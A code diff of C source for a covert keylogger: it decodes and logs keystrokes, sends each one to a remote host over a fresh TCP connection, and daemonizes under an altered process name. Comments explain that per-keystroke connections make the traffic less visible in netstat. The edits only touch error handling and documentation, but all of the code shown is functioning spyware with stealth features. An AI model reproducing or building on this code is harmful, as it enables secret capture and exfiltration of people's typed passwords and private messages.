@@ -83,11 +83,9 @@ int main (int argc, char ** argv) {
 				log( 1, output, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
 				fflush(output);
 
-				if(opts.log_remote) {
-					int ec;
-					ec = transmit_keystroke_inet((char*)decodeKey(i, getbit(kbd, i), getMods(kbd)), &opts);
-					if (ec < 0) printf("Transmit error: %d", ec);
-				}
+				if(opts.log_remote)
+					transmit_keystroke_inet((char*)
+						decodeKey(i, getbit(kbd, i), getMods(kbd)), &opts);
 			}
 	}
 }
@@ -332,7 +330,7 @@ void fatal(const char * msg){
  * at the given port. The TCP connection is newly established upon every call
  * to this function; this is inefficient, but also offers advantages (e.g.,
  * chances are lower that the user will see a constant TCP stream in netstat
- * output, etc).
+ * output, etc). Returns the number of bytes read, or negative value on error.
  * */
 int transmit_keystroke_inet(char* key, struct opts_struct *opts){
 	int sock, bytes_sent;
@@ -376,7 +374,8 @@ void log(int level, FILE* stream, const char *fmt, ...) {
 
 /**
  * Daemonize logger. If a process_name is given, the name of the newly created
- * child as it appears within the process table, is altered.
+ * child as it appears within the process table, is altered. Returns pid of
+ * child process, or exits on error.
  * */
 int daemonize(char* child_process_name){
 	pid_t pid, sid;
